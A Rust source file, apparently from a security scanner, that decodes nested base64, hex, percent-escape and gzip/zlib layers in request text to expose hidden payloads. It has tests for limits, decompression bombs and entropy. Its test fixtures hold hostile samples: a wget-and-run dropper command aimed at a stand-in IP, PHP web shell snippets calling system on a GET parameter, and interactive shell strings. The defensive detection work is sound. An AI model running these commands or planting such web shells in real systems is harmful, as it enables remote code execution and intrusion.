//! The decoders: find encoded runs in a layer's text and open them as child
//! layers. Candidates come from `regex::bytes`, which does not backtrack,
//! and overlaps are tracked in a bitmap, so a layer costs time linear in
//! its size (times a small constant for the base64 retries).

use std::collections::VecDeque;
use std::io::Read;
use std::sync::LazyLock;

use data_encoding::{Encoding, HEXLOWER_PERMISSIVE, Specification};
use regex::bytes::Regex;

use super::{Budget, Layer, LayerKind, MAX_LAYERS, MAX_OUTPUT, Opaque, OpaqueReason, Span, Xray};

/// Shortest base64 run looked at, and shortest hex run (characters).
const B64_MIN: usize = 16;
const HEX_MIN: usize = 32;

/// High entropy is only called on runs decoding to at least this many
/// bytes, at this many bits per byte.
const ENTROPY_MIN_LEN: usize = 128;
const ENTROPY_MIN_BITS: f64 = 6.5;

/// Separators a base64 run may start behind (`/cgi-bin/` + payload); the
/// payload is tried after each of the first few.
const B64_RETRIES: usize = 8;

/// A base64 run: a first line, then wrapped lines, then padding.
static B64: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r"(?-u)[A-Za-z0-9+/_-]{{{B64_MIN},}}(?:\r?\n[A-Za-z0-9+/_-]+)*={{0,2}}"
    ))
    .expect("static regex")
});
static HEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(r"(?-u)(?:[0-9A-Fa-f]{{2}}){{{},}}", HEX_MIN / 2)).expect("static regex")
});
static PERCENT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?-u)(?:[A-Za-z0-9_.~!*'()/:-]|%[0-9A-Fa-f]{2}){6,}").expect("static regex")
});
static BACKSLASH_X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?-u)(?:\\x[0-9A-Fa-f]{2}){4,}").expect("static regex"));

/// Standard alphabet, no padding, and trailing bits ignored, as PHP's
/// `base64_decode` and `base64 -d` do.
static BASE64_LENIENT: LazyLock<Encoding> = LazyLock::new(|| {
    let mut spec = Specification::new();
    spec.symbols
        .push_str("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
    spec.check_trailing_bits = false;
    spec.encoding().expect("static base64 specification")
});

type Decoder = fn(&[u8], usize, usize) -> Option<Found>;

/// A decoded run found in a layer; `skip` is how far into the run the
/// encoded part starts.
enum Found {
    Open {
        kind: LayerKind,
        bytes: Vec<u8>,
        skip: usize,
    },
    Opaque(OpaqueReason, usize),
}

/// Open every layer reachable from `layer`, spending `budget`. Children are
/// appended to `xray.layers` and queued; nothing recurses.
pub(crate) fn decode_all(xray: &mut Xray, layer: usize, budget: &mut Budget) {
    let mut queue = VecDeque::from([layer]);
    while let Some(at) = queue.pop_front() {
        if at >= xray.layers.len() {
            continue;
        }
        let text = std::mem::take(&mut xray.layers[at].text);
        scan(xray, at, &text, budget, &mut queue);
        xray.layers[at].text = text;
    }
}

/// Nothing more can be recorded: layers are full and the opaque list is
/// full with the over-limit mark in it.
fn saturated(xray: &Xray, budget: &Budget) -> bool {
    xray.layers.len() >= budget.layers
        && xray.opaque.len() >= MAX_LAYERS
        && xray
            .opaque
            .iter()
            .any(|o| o.reason == OpaqueReason::OverLimit)
}

fn scan(xray: &mut Xray, at: usize, text: &[u8], budget: &mut Budget, queue: &mut VecDeque<usize>) {
    if !printable_enough(text)
        && let Some(kind) = compressed(text)
    {
        let whole = Span {
            layer: at,
            start: 0,
            end: text.len(),
        };
        if open_compressed(xray, at, text, kind, whole, budget, queue) {
            return;
        }
    }
    let mut taken = vec![false; text.len()];
    let decoders: [Decoder; 4] = [percent, backslash_x, hex, base64];
    let regexes: [&Regex; 4] = [&PERCENT, &BACKSLASH_X, &HEX, &B64];
    for (decoder, regex) in decoders.iter().zip(regexes) {
        for m in regex.find_iter(text) {
            if saturated(xray, budget) {
                return;
            }
            let (start, end) = (m.start(), m.end());
            if taken[start..end].iter().any(|&t| t) {
                continue;
            }
            let Some(found) = decoder(text, start, end) else {
                continue;
            };
            let skip = match found {
                Found::Open { skip, .. } | Found::Opaque(_, skip) => skip,
            };
            let at_span = Span {
                layer: at,
                start: start + skip,
                end,
            };
            taken[start..end].fill(true);
            match found {
                Found::Opaque(reason, _) => push_opaque(xray, at_span, reason),
                Found::Open { kind, bytes, .. } => {
                    open(xray, at, kind, at_span, bytes, budget, queue)
                }
            }
        }
    }
}

/// Bounded like layers, so a body of many candidates stays small; past the
/// cap one entry per reason is still kept.
fn push_opaque(xray: &mut Xray, at: Span, reason: OpaqueReason) {
    if xray.opaque.len() < MAX_LAYERS || !xray.opaque.iter().any(|o| o.reason == reason) {
        xray.opaque.push(Opaque { at, reason });
    }
}

/// Add `bytes` as a child of `parent`, if the limits allow.
pub(super) fn open(
    xray: &mut Xray,
    parent: usize,
    kind: LayerKind,
    at: Span,
    bytes: Vec<u8>,
    budget: &mut Budget,
    queue: &mut VecDeque<usize>,
) {
    if xray.depth(parent) + 1 > budget.depth {
        return push_opaque(xray, at, OpaqueReason::TooDeep);
    }
    if xray.layers.len() >= budget.layers || bytes.len() > budget.output {
        return push_opaque(xray, at, OpaqueReason::OverLimit);
    }
    budget.output -= bytes.len();
    xray.layers.push(Layer {
        kind,
        parent: Some(parent),
        from: Some(at),
        text: bytes,
        name: None,
        collapsed: 0,
    });
    queue.push_back(xray.layers.len() - 1);
}

#[derive(Clone, Copy)]
enum Compression {
    Gzip,
    Zlib,
}

fn compressed(text: &[u8]) -> Option<Compression> {
    match text {
        [0x1f, 0x8b, ..] => Some(Compression::Gzip),
        // The zlib headers of the four compression levels, no dictionary.
        [0x78, 0x01 | 0x5e | 0x9c | 0xda, ..] => Some(Compression::Zlib),
        _ => None,
    }
}

/// Read at most `limit` bytes and one more, so a bomb stops while it
/// streams. The flag says the stream ended in an error (what was read
/// before it is kept).
fn read_limited(reader: impl Read, limit: usize) -> (Vec<u8>, bool) {
    let cap = u64::try_from(limit).unwrap_or(u64::MAX).saturating_add(1);
    let mut out = Vec::new();
    let failed = reader.take(cap).read_to_end(&mut out).is_err();
    (out, failed)
}

/// Raw deflate (PHP `gzinflate`), at most `limit` bytes of output.
pub(crate) fn inflate_raw(bytes: &[u8], limit: usize) -> Option<Vec<u8>> {
    let (mut out, _) = read_limited(flate2::read::DeflateDecoder::new(bytes), limit);
    out.truncate(limit);
    (!out.is_empty()).then_some(out)
}

/// Zlib (PHP `gzuncompress`), at most `limit` bytes of output.
pub(super) fn inflate_zlib(bytes: &[u8], limit: usize) -> Option<Vec<u8>> {
    let (mut out, _) = read_limited(flate2::read::ZlibDecoder::new(bytes), limit);
    out.truncate(limit);
    (!out.is_empty()).then_some(out)
}

/// Base64 as PHP's `base64_decode` reads it: line breaks and padding cut,
/// trailing bits ignored.
pub(super) fn base64_lenient(run: &[u8]) -> Option<Vec<u8>> {
    let clean: Vec<u8> = run
        .iter()
        .copied()
        .filter(|b| !b.is_ascii_whitespace())
        .take_while(|&b| b != b'=')
        .collect();
    if clean.len() % 4 == 1 {
        return None;
    }
    BASE64_LENIENT.decode(&clean).ok()
}

/// Hex digits to bytes (PHP `hex2bin`).
pub(super) fn hex_bytes(run: &[u8]) -> Option<Vec<u8>> {
    HEXLOWER_PERMISSIVE.decode(run).ok()
}

/// Decompress `text`, the text of `parent`. True when it was a stream:
/// the caller then skips the regexes on its bytes. TooDeep is only claimed
/// after real output.
fn open_compressed(
    xray: &mut Xray,
    parent: usize,
    text: &[u8],
    kind: Compression,
    at: Span,
    budget: &mut Budget,
    queue: &mut VecDeque<usize>,
) -> bool {
    let limit = budget.output.min(MAX_OUTPUT);
    let (mut out, failed) = match kind {
        Compression::Gzip => read_limited(flate2::read::GzDecoder::new(text), limit),
        Compression::Zlib => read_limited(flate2::read::ZlibDecoder::new(text), limit),
    };
    if out.is_empty() || (failed && !worth_opening(&out)) {
        if failed {
            push_opaque(xray, at, OpaqueReason::UnknownEncoding);
        }
        return false;
    }
    let over = out.len() > limit;
    out.truncate(limit);
    if !out.is_empty() {
        open(xray, parent, LayerKind::Gzip, at, out, budget, queue);
    }
    if over {
        push_opaque(xray, at, OpaqueReason::OverLimit);
    }
    true
}

pub(super) fn printable_enough(bytes: &[u8]) -> bool {
    if bytes.is_empty() {
        return false;
    }
    printable_count(bytes) * 10 >= bytes.len() * 9
}

fn printable_count(bytes: &[u8]) -> usize {
    bytes
        .iter()
        .filter(|&&b| matches!(b, 0x20..=0x7e | b'\t' | b'\n' | b'\r'))
        .count()
}

fn has_marker(bytes: &[u8]) -> bool {
    compressed(bytes).is_some() || bytes.starts_with(b"-----BEGIN")
}

/// Decoded bytes worth a layer: mostly printable, or a known container.
pub(super) fn worth_opening(bytes: &[u8]) -> bool {
    printable_enough(bytes) || has_marker(bytes)
}

fn entropy(bytes: &[u8]) -> f64 {
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[usize::from(b)] += 1;
    }
    let n = bytes.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

/// Decode one base64 attempt: line breaks dropped, padding cut, both
/// alphabets read as one.
fn try_base64(run: &[u8]) -> Option<Found> {
    let clean: Vec<u8> = run
        .iter()
        .copied()
        .filter(|&b| b != b'\r' && b != b'\n')
        .take_while(|&b| b != b'=')
        .map(|b| match b {
            b'-' => b'+',
            b'_' => b'/',
            b => b,
        })
        .collect();
    if clean.len() < B64_MIN || clean.len() % 4 == 1 {
        return None;
    }
    let bytes = BASE64_LENIENT.decode(&clean).ok()?;
    if worth_opening(&bytes) {
        Some(Found::Open {
            kind: LayerKind::Base64,
            bytes,
            skip: 0,
        })
    } else if bytes.len() >= ENTROPY_MIN_LEN && entropy(&bytes) >= ENTROPY_MIN_BITS {
        Some(Found::Opaque(OpaqueReason::HighEntropy, 0))
    } else {
        None
    }
}

fn with_skip(found: Found, skip: usize) -> Found {
    match found {
        Found::Open { kind, bytes, .. } => Found::Open { kind, bytes, skip },
        Found::Opaque(reason, _) => Found::Opaque(reason, skip),
    }
}

fn base64(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let run = &text[start..end];
    // The whole run, then the payload behind a path-like prefix, then the
    // first line alone (when what follows it is not base64 after all).
    let mut starts = vec![0];
    starts.extend(
        run.iter()
            .enumerate()
            .filter(|&(_, &b)| matches!(b, b'/' | b'-' | b'_'))
            .take(B64_RETRIES)
            .map(|(i, _)| i + 1),
    );
    let mut opaque = None;
    let mut best: Option<(usize, Found)> = None;
    let first_line = run.iter().position(|&b| b == b'\n').map(|n| &run[..n]);
    let attempts = starts
        .iter()
        .map(|&s| (s, &run[s..]))
        .chain(first_line.map(|l| (0, l)));
    for (skip, part) in attempts {
        match try_base64(part) {
            // A misaligned start still decodes to a little junk before the
            // payload; the attempt with the least junk is the right one.
            Some(Found::Open { kind, bytes, .. }) => {
                let junk = if has_marker(&bytes) {
                    0
                } else {
                    bytes.len() - printable_count(&bytes)
                };
                if best.as_ref().is_none_or(|(least, _)| junk < *least) {
                    best = Some((junk, Found::Open { kind, bytes, skip }));
                }
            }
            Some(found) if opaque.is_none() => opaque = Some(with_skip(found, skip)),
            _ => {}
        }
    }
    best.map(|(_, found)| found).or(opaque)
}

fn hex(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let bytes = HEXLOWER_PERMISSIVE.decode(&text[start..end]).ok()?;
    worth_opening(&bytes).then_some(Found::Open {
        kind: LayerKind::Hex,
        bytes,
        skip: 0,
    })
}

fn hex_digit(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        _ => b - b'A' + 10,
    }
}

fn percent(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let run = &text[start..end];
    let mut bytes = Vec::with_capacity(run.len());
    let mut escapes = 0;
    let mut i = 0;
    while i < run.len() {
        if run[i] == b'%' {
            bytes.push(hex_digit(run[i + 1]) << 4 | hex_digit(run[i + 2]));
            escapes += 1;
            i += 3;
        } else {
            bytes.push(run[i]);
            i += 1;
        }
    }
    (escapes >= 3 && worth_opening(&bytes)).then_some(Found::Open {
        kind: LayerKind::Escapes,
        bytes,
        skip: 0,
    })
}

fn backslash_x(text: &[u8], start: usize, end: usize) -> Option<Found> {
    let bytes: Vec<u8> = text[start..end]
        .chunks(4)
        .map(|c| hex_digit(c[2]) << 4 | hex_digit(c[3]))
        .collect();
    worth_opening(&bytes).then_some(Found::Open {
        kind: LayerKind::Escapes,
        bytes,
        skip: 0,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use std::io::Write;

    fn b64(bytes: &[u8]) -> Vec<u8> {
        data_encoding::BASE64_NOPAD.encode(bytes).into_bytes()
    }

    fn gzip(bytes: &[u8]) -> Vec<u8> {
        let mut e = GzEncoder::new(Vec::new(), Compression::default());
        e.write_all(bytes).unwrap();
        e.finish().unwrap()
    }

    fn run(body: &[u8]) -> Xray {
        let mut x = Xray::new(body);
        let mut budget = Budget::default();
        decode_all(&mut x, 0, &mut budget);
        x
    }

    fn kinds(x: &Xray) -> Vec<LayerKind> {
        x.layers.iter().map(|l| l.kind).collect()
    }

    fn decoded_total(x: &Xray) -> usize {
        x.layers.iter().skip(1).map(|l| l.text.len()).sum()
    }

    const CMD: &[u8] = b"cd /tmp; wget http://203.0.113.7/x.sh; sh x.sh";

    #[test]
    fn base64_layer_opens_printable_text() {
        let x = run(&[b"cmd=", b64(CMD).as_slice()].concat());
        assert_eq!(kinds(&x), [LayerKind::Raw, LayerKind::Base64]);
        assert_eq!(x.layers[1].text, CMD);
        assert_eq!(x.layers[1].parent, Some(0));
        assert_eq!(x.layers[1].from.unwrap().start, 4);
    }

    #[test]
    fn base64url_opens() {
        let plain = b"<?php system($_GET['c'] ?? '>>>???'); ?>";
        let enc = data_encoding::BASE64URL_NOPAD.encode(plain);
        assert!(enc.contains('_') || enc.contains('-'), "{enc}");
        let x = run(enc.as_bytes());
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text, plain);
    }

    #[test]
    fn random_token_is_not_a_layer() {
        let x = run(b"sid=Zk3pQ9xLm2Vb7TnR4sYd8WcA1uHe6JgF");
        assert_eq!(x.layers.len(), 1);
        assert!(x.opaque.is_empty());
        let x = run(b"sid=5f4dcc3b5aa765d61d8327deb882cf99");
        assert_eq!(x.layers.len(), 1);
    }

    #[test]
    fn gzip_after_base64_opens() {
        let x = run(&b64(&gzip(CMD)));
        assert_eq!(
            kinds(&x),
            [LayerKind::Raw, LayerKind::Base64, LayerKind::Gzip]
        );
        assert_eq!(x.layers[2].text, CMD);
        assert_eq!(x.layers[2].parent, Some(1));
    }

    #[test]
    fn percent_run_opens() {
        let x = run(b"x=%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E&y=1");
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].kind, LayerKind::Escapes);
        assert_eq!(x.layers[1].text, b"<?php system($_GET['c']); ?>");
    }

    #[test]
    fn hex_escapes_open() {
        let x = run(br"echo -e '\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69'");
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].kind, LayerKind::Escapes);
        assert_eq!(x.layers[1].text, b"/bin/sh -i");
        let x = run(b"2f62696e2f7368202d6320226964203e202f746d702f6f757422");
        assert_eq!(x.layers[1].kind, LayerKind::Hex);
        assert_eq!(x.layers[1].text, b"/bin/sh -c \"id > /tmp/out\"");
    }

    #[test]
    fn depth_stops_at_6_with_too_deep() {
        let mut body = b"echo hello from the seventh layer, plain text".to_vec();
        for _ in 0..7 {
            body = b64(&body);
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 7, "raw plus 6");
        assert_eq!(x.depth(6), 6);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::TooDeep);
        assert_eq!(x.opaque[0].at.layer, 6);
    }

    #[test]
    fn gzip_bomb_stops_at_256_kib() {
        let bomb = gzip(&vec![0u8; 10 * 1024 * 1024]);
        // Raw, so the whole per-decompression limit is available.
        let x = run(&bomb);
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text.len(), 256 * 1024);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
        // Behind base64, the encoded bomb counts against the same total.
        let x = run(&b64(&bomb));
        assert!(decoded_total(&x) <= 256 * 1024);
        let gz = x.layers.iter().find(|l| l.kind == LayerKind::Gzip).unwrap();
        assert!(gz.text.len() <= 256 * 1024);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn total_output_stops_at_256_kib() {
        let mut body = Vec::new();
        for i in 0..8u8 {
            let mut chunk = vec![b'a' + i; 100 * 1024];
            chunk.extend_from_slice(b" end");
            body.extend_from_slice(&b64(&chunk));
            body.push(b' ');
        }
        let x = run(&body);
        assert!(decoded_total(&x) <= 256 * 1024);
        assert!(x.layers.len() > 1);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn layer_count_is_capped() {
        let mut body = Vec::new();
        for i in 0..400u32 {
            body.extend_from_slice(&b64(format!("echo number {i} goes here").as_bytes()));
            body.push(b' ');
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 128);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn high_entropy_is_opaque() {
        let mut state = 0x2545_f491_4f6c_dd1du64;
        let noise: Vec<u8> = (0..1024)
            .map(|_| {
                state ^= state << 13;
                state ^= state >> 7;
                state ^= state << 17;
                (state >> 24) as u8
            })
            .collect();
        let x = run(&b64(&noise));
        assert_eq!(x.layers.len(), 1);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::HighEntropy);
    }

    fn zlib(bytes: &[u8]) -> Vec<u8> {
        let mut e = flate2::write::ZlibEncoder::new(Vec::new(), Compression::default());
        e.write_all(bytes).unwrap();
        e.finish().unwrap()
    }

    fn varied_text(lines: u32) -> Vec<u8> {
        (0..lines)
            .flat_map(|i| format!("echo step {i} >> /tmp/log{}\n", i * 7919 % 1013).into_bytes())
            .collect()
    }

    #[test]
    fn plain_text_that_looks_like_a_zlib_header_is_left_alone() {
        for body in [
            &b"x^2 + y^2"[..],
            b"x hello world, this is plain text",
            b"x?a=1&b=2",
            b"x}",
        ] {
            let x = run(body);
            assert_eq!(x.layers.len(), 1, "{:?}", String::from_utf8_lossy(body));
            assert!(x.opaque.is_empty(), "{:?}", String::from_utf8_lossy(body));
        }
    }

    #[test]
    fn no_false_too_deep_at_the_bottom() {
        let mut body = b"x plain text at the bottom".to_vec();
        for _ in 0..6 {
            body = b64(&body);
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 7);
        assert!(x.opaque.is_empty(), "{:?}", x.opaque);
    }

    #[test]
    fn too_deep_needs_real_output() {
        // A real gzip at depth 7 is TooDeep; one that is not a stream is not.
        let mut body = gzip(CMD);
        for _ in 0..6 {
            body = b64(&body);
        }
        let x = run(&body);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::TooDeep);
    }

    #[test]
    fn zlib_opens_raw_and_after_base64() {
        let x = run(&zlib(CMD));
        assert_eq!(kinds(&x), [LayerKind::Raw, LayerKind::Gzip]);
        assert_eq!(x.layers[1].text, CMD);
        let x = run(&b64(&zlib(CMD)));
        assert_eq!(
            kinds(&x),
            [LayerKind::Raw, LayerKind::Base64, LayerKind::Gzip]
        );
        assert_eq!(x.layers[2].text, CMD);
    }

    #[test]
    fn corrupt_gzip_is_unknown_encoding() {
        let mut body = vec![0x1f, 0x8b, 0x08, 0x00, 0, 0, 0, 0, 0, 0xff];
        body.extend_from_slice(&[0xff, 0x13, 0x77, 0x00, 0xfe, 0xfe, 0x42, 0x99]);
        let x = run(&body);
        assert_eq!(x.layers.len(), 1);
        assert_eq!(x.opaque.len(), 1);
        assert_eq!(x.opaque[0].reason, OpaqueReason::UnknownEncoding);
    }

    #[test]
    fn truncated_gzip_keeps_its_printable_start() {
        let full = gzip(&varied_text(3000));
        let cut = &full[..full.len() * 6 / 10];
        let x = run(cut);
        assert_eq!(x.layers.len(), 2);
        assert!(x.layers[1].text.starts_with(b"echo step 0 >>"));
        assert!(x.opaque.is_empty(), "{:?}", x.opaque);
    }

    #[test]
    fn pem_marker_opens_binary_base64() {
        let mut der = b"-----BEGIN CERTIFICATE-----\n".to_vec();
        der.extend((0..90u8).map(|i| 0x80 | i));
        let x = run(&b64(&der));
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text, der);
    }

    #[test]
    fn compressed_bytes_are_not_scanned_twice() {
        // Stored (uncompressed) deflate: the payload sits in the stream in
        // the clear, but must open once, through the decoder.
        let mut e = GzEncoder::new(Vec::new(), Compression::none());
        e.write_all(&b64(CMD)).unwrap();
        let x = run(&e.finish().unwrap());
        assert_eq!(
            kinds(&x),
            [LayerKind::Raw, LayerKind::Gzip, LayerKind::Base64]
        );
    }

    #[test]
    fn base64_behind_a_path_prefix_opens() {
        for prefix in ["/", "/a/", "/cgi-bin/", "x-y_z/"] {
            let body = [prefix.as_bytes(), &b64(CMD)].concat();
            let x = run(&body);
            assert_eq!(x.layers.len(), 2, "{prefix}");
            assert_eq!(x.layers[1].text, CMD, "{prefix}");
            assert_eq!(x.layers[1].from.unwrap().start, prefix.len(), "{prefix}");
        }
    }

    #[test]
    fn mixed_alphabets_open() {
        let plain = b">>>??? echo mixed alphabets are read as one";
        let enc = data_encoding::BASE64_NOPAD.encode(plain);
        assert!(enc.contains('+') && enc.contains('/'));
        let mixed = enc.replace('/', "_");
        let x = run(mixed.as_bytes());
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text, plain);
    }

    #[test]
    fn nonzero_trailing_bits_open() {
        let plain = b"echo trailing bits are ignored!"; // 31 bytes: 42 chars
        let mut enc = data_encoding::BASE64_NOPAD.encode(plain).into_bytes();
        assert!(data_encoding::BASE64_NOPAD.decode(&enc).is_ok());
        let last = enc.len() - 1;
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let i = alphabet.iter().position(|&c| c == enc[last]).unwrap();
        enc[last] = alphabet[i | 1];
        if enc[last] == alphabet[i] {
            enc[last] = alphabet[i ^ 1];
        }
        assert!(data_encoding::BASE64_NOPAD.decode(&enc).is_err(), "strict");
        let x = run(&enc);
        assert_eq!(x.layers.len(), 2);
        assert_eq!(x.layers[1].text, plain);
    }

    #[test]
    fn wrapped_base64_joins_lines() {
        let enc = b64(&gzip(&varied_text(40)));
        let wrapped: Vec<u8> = enc
            .chunks(20)
            .flat_map(|c| c.iter().copied().chain(*b"\r\n"))
            .collect();
        let x = run(&wrapped);
        assert_eq!(
            kinds(&x),
            [LayerKind::Raw, LayerKind::Base64, LayerKind::Gzip]
        );
        assert_eq!(x.layers[2].text, varied_text(40));
    }

    #[test]
    fn opaque_cap_keeps_one_entry_per_reason() {
        let noise = |seed: u64| -> Vec<u8> {
            let mut state = seed | 1;
            (0..256)
                .map(|_| {
                    state ^= state << 13;
                    state ^= state >> 7;
                    state ^= state << 17;
                    (state >> 24) as u8
                })
                .collect()
        };
        let mut body = Vec::new();
        for seed in 1..=150u64 {
            body.extend_from_slice(&b64(&noise(seed)));
            body.push(b' ');
        }
        // Then enough text candidates to fill the layers.
        for i in 0..200u32 {
            body.extend_from_slice(&b64(format!("echo number {i} goes here").as_bytes()));
            body.push(b' ');
        }
        let x = run(&body);
        assert!(x.opaque.len() <= 128 + 4);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn many_candidates_stay_fast() {
        // A megabyte of short tokens: linear, and it stops once full.
        let token = b64(b"echo tick tock");
        let mut body = Vec::new();
        while body.len() < 1 << 20 {
            body.extend_from_slice(&token);
            body.push(b' ');
        }
        let x = run(&body);
        assert_eq!(x.layers.len(), 128);
    }

    #[test]
    fn seeded_noise_is_total_and_bounded() {
        let mut state = 0x9e37_79b9_7f4a_7c15u64;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        let alphabets: [&[u8]; 3] = [
            b"",
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/-_=\r\n",
            b"%\\x0123456789abcdefABCDEF &=\n",
        ];
        for round in 0..300 {
            let len = (next() % 3000) as usize;
            let alphabet = alphabets[round % 3];
            let body: Vec<u8> = (0..len)
                .map(|_| {
                    let r = next();
                    if alphabet.is_empty() {
                        (r >> 16) as u8
                    } else {
                        alphabet[(r >> 16) as usize % alphabet.len()]
                    }
                })
                .collect();
            let x = run(&body);
            assert!(x.layers.len() <= 128);
            assert!(decoded_total(&x) <= 256 * 1024);
            assert!(x.opaque.len() <= 128 + 4);
            for l in &x.layers {
                if let Some(from) = l.from {
                    assert!(from.start <= from.end && from.end <= x.layers[from.layer].text.len());
                }
            }
        }
    }

    #[test]
    fn inflate_raw_streams_to_the_limit() {
        let mut e = flate2::write::DeflateEncoder::new(Vec::new(), Compression::default());
        e.write_all(CMD).unwrap();
        assert_eq!(inflate_raw(&e.finish().unwrap(), 1024).unwrap(), CMD);
        let mut e = flate2::write::DeflateEncoder::new(Vec::new(), Compression::default());
        e.write_all(&vec![0u8; 10 * 1024 * 1024]).unwrap();
        let out = inflate_raw(&e.finish().unwrap(), 4096).unwrap();
        assert_eq!(out.len(), 4096);
        assert!(inflate_raw(&[], 16).is_none());
    }
}
